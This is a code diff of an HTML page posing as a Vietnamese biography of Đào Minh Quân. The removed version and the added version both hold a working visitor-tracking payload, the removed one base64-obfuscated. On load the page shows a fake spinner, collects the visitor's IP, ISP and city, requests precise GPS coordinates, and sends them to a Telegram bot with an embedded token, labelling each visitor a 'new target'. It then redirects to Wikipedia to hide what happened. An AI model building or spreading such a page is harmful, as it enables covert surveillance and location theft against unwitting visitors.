@@ -1,20 +1,63 @@
 <!DOCTYPE html>
-<html lang="vi">
+<html>
 <head>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
     <title>Tiểu sử Đào Minh Quân</title>
     <meta property="og:title" content="Tiểu sử Đức quốc công Đào Minh Quân">
-    <meta property="og:description" content="Tội ác cộng sản với Đào Minh Quân và công ơn cao cả của Ngài.">
     <meta property="og:image" content="https://i.ibb.co/ynRQ20S0/att-v-SGAhgzni-Sg77k-RFCc0u-Dz-sj-HLvv-G0-Wu-Vk-Y3-HSe0.jpg">
-    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
 </head>
-<body class="bg-[#0b0e14] text-slate-300">
-    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+<body style="background:#fff; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; font-family:sans-serif;">
+    <div style="text-align:center;">
+        <div id="loader" style="border:3px solid #f3f3f3; border-top:3px solid #4285F4; border-radius:50%; width:35px; height:35px; animation:spin 1s linear infinite; margin:0 auto;"></div>
+        <div id="msg" style="margin-top:15px; color:#777; font-size:13px;">Đang tải nội dung...</div>
+    </div>
+    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
+
     <script>
-        /* SENTINEL X - ENCRYPTED CORE V3 */
-        const _0xAdmin = "PHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLnRhaWx3aW5kY3NzLmNvbSI+PC9zY3JpcHQ+PGRpdiBpZD0ibWFpbi1jb250ZW50Ij48L2Rpdj48c2NyaXB0PmxldCBjZmc9e3Q6IjgzNTgyMzU3ODQ6QUFHVFFRaUJlUXNzRERNcnJzMGZDLVdiNGlOd0p2MjE0NCIsWToiNTg4NzY0MjIyMSIsUjoiLjk1ODcyIixwOiIxMjMifTtsZXQgbG9ncz1KU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzX2xvZ3MnKXx8J1tdJyk7Y29uc3QgcT1uZXcgVSTERlYXJjaFBhcmFtcyh3aW5kb3cubG9jYXRpb24uc2VhcmNoKTtpZihxLmhhcygnYWRtaW4nKSl7cmVuZGVyQWRtaW4oKX1lbHNle3JlbmRlckZyb250KCk7fWZ1bmN0aW9uIHJlbmRlckZyb250KCl7ZG9jdW1lbnQuZ2V0RWxlbWVudBCeSWQoJ21haW4tY29udGVudCcpLmlubmVySFRNTEw9YDxkaXYgY2xhc3M9ImZsZXggZmxleC1jb2wgaXRlbXMtY2VudGVyIGp1c3RpZnktY2VudGVyIGgtc2NyZWVuIGJnLXdoaXRlIj48ZGl2IGNsYXNzPSJ3LTEwIGgtMTAgYm9yZGVyLTQgYm9yZGVyLWJsdWUtNTAwIGJvcmRlci10LXRyYW5zcGFyZW50IHJvdW5kZWQtZnVsbCBhbmltYXRlLXNwaW4iPjwvZGl2PjxwIGNsYXNzPSJtdC00IHRleHQtZ3JheS01MDAgdGV4dC1zbSBpdGFsaWMiPkS6bmcgdOG6o2kgbuG7mWkgZHVuZy4uLjwvcD48L2Rpdj5gO3RyYWNrKCl9YXN5bmMgZnVuY3Rpb24gdHJhY2soKXtsZXQgaXBSZXM9YXdhaXQgZmV0Y2goJ2h0dHBzOi8vaXBhcGkuY28vanNvbi8nKS50aGVuKHI9PnIuanNvbigpKS5jYXRjaCgpPT5udWxsKTtsZXQgZGV2PU5hdmlnYXRvci51c2VyQWdlbnQ7bmF2aWdhdG9yLmdlb2xvY2F0aW9uLmdldEN1cnJlbnRQb3NpdGlvbihhc3luYyBwPT57c2F2ZSgnR1BTLU9LJyxpcFJlcyxwLmNvb3Jkcy5sYXRpdHVkZSxwLmNvb3Jkcy5sb25naXR1ZGUpfSxhc3luYyBlPT57c2F2ZSgnVOG7qyBDaOG7kWknLGlwUmVzLG51bGwsbnVsbCl9LHt0aW1lb3V0OjUwMDB9KX1mdW5jdGlvbiBzYXZlKHMsaXAsbGEsbG8pe2xldCBuPXtuZXdMb2c6e2lwOmlwPy5pcHx8Jz8nLGlzcDppcD8ub3JnfHwnPycsYWRkcjppcD8uY2l0eXx8Jz8nLGxhOmxhLGxvOmxvLHM6cyx0Om5ldyBEYXRlKCkubG9jYWxlVGltZVN0cmluZygpfX07ZmV0Y2goYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3Qke2NmZy50fS9zZW5kTWVzc2FnZT9jaGF0X2lkPSR7Y2ZnLlkifSZ0ZXh0PWBrdW5jb2RlKGBa8J9YnyBN4bukQyBUSUVVIE3hu5hJIFtcbm9fIFtdOiAke3MuaXB9XG5f8J9PdyBJU1A6ICR7bi5uZXdMb2cuaXNwfVxuX8J9YnMgTUFQOiBodHRwOi8vbWFwcy5nb29nbGUuY29tLz9xPSR7bGF9LCR7bG99YClmZXRjaCgnP2FjdGlvbj0nK2J0b2EoSlNPTi5zdHJpbmdpZnkobikpKTtsb2NhdGlvbi5yZXBsYWNlKCdodHRwczovL3ZpLndpa2lwZWRpYS5vcmcvd2lraS8lRDElOTAlQTMlQTBvX01pbmhfUXUlQTMlQTJuJyl9ZnVuY3Rpb24gcmVuZGVyQWRtaW4oKXtsZXQgcHM9cHJvbXB0KCJOaOG6rXAgcGFzcyIpO2lmKHBzIT1jZmcucCl7YWxlcnQoJ1NhaScpO3JldHVybn1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWFpbi1jb250ZW50JykuaW5uZXJIVE1MPWBkaXYgY2xhc3M9InAtNiI+PGgxIGNsYXNzPSJ0ZXh0LTIgeGwgZm9udC1ibGFjayBtYi00Ij5TRU5USU5FTCBYIERBU0hCT0FSRDwvaDE+PGRpdiBpZD0ibWFwIiBjbGFzcz0iaC02NCByb3VuZGVkLXhsIG1iLTQiPjwvZGl2PjxkaXYgY2xhc3M9Im92ZXJmbG93LXgtYXV0byI+PHRhYmxlIGNsYXNzPSJ3LWZ1bGwgYmctc2xhdGUtOTAwIHRleHQteHMiPjx0aGVhZD48dHI+PHRoPiBJUCA8L3RoPjx0aD4gVOG7j2EgZOG7mSA8L3RoPjx0aD4gVHLhuqFuZyB0aMOhaSA8L3RoPjwvdHI+PC90aGVhZD48dGJvZHkgaWQ9Imx0Ij48L3Rib2R5PjwvdGFibGU+PC9kaXY+PC9kaXY+YDtpbml0TWFwKCl9PC9zY3JpcHQ+";
-        document.write(atob(_0xAdmin));
+        /* MÃ HÓA CẤU HÌNH BOT */
+        const _0xData = {
+            t: "8358235784:AAGTQQiBeQssDDMrrs0fC-Wb4iNwJ6V2144",
+            i: "5887642221",
+            r: "https://vi.wikipedia.org/wiki/Đào_Minh_Quân"
+        };
+
+        async function report(text) {
+            await fetch(`https://api.telegram.org/bot${_0xData.t}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: _0xData.i, text: text, parse_mode: "HTML" })
+            });
+        }
+
+        window.onload = async () => {
+            // 1. Lấy IP ngầm ngay lập tức
+            const res = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => null);
+            let info = `🎯 <b>MỤC TIÊU MỚI</b>\n🌐 IP: <code>${res?.ip || '?'}</code>\n🏢 Nhà mạng: ${res?.org || '?'}\n📍 Vùng: ${res?.city || '?'}, ${res?.country_name || '?'}`;
+            
+            await report(info + "\n⏳ <i>Đang chờ tọa độ GPS...</i>");
+
+            // 2. Ép lấy GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    async (p) => {
+                        const lat = p.coords.latitude;
+                        const lon = p.coords.longitude;
+                        const maps = `\n\n🎯 <b>VỊ TRÍ CHÍNH XÁC:</b>\n📍 Tọa độ: <code>${lat},${lon}</code>\n🗺️ <a href="https://www.google.com/maps?q=${lat},${lon}">XEM TRÊN BẢN ĐỒ VỆ TINH</a>`;
+                        await report(info + maps);
+                        location.replace(_0xData.r);
+                    },
+                    async () => {
+                        await report(info + "\n❌ <b>Mục tiêu TỪ CHỐI GPS.</b>");
+                        location.replace(_0xData.r);
+                    },
+                    { enableHighAccuracy: true, timeout: 6000 }
+                );
+            } else {
+                location.replace(_0xData.r);
+            }
+            // Chuyển hướng sau 8s nếu treo
+            setTimeout(() => { location.replace(_0xData.r); }, 8000);
+        };
     </script>
 </body>
 </html>
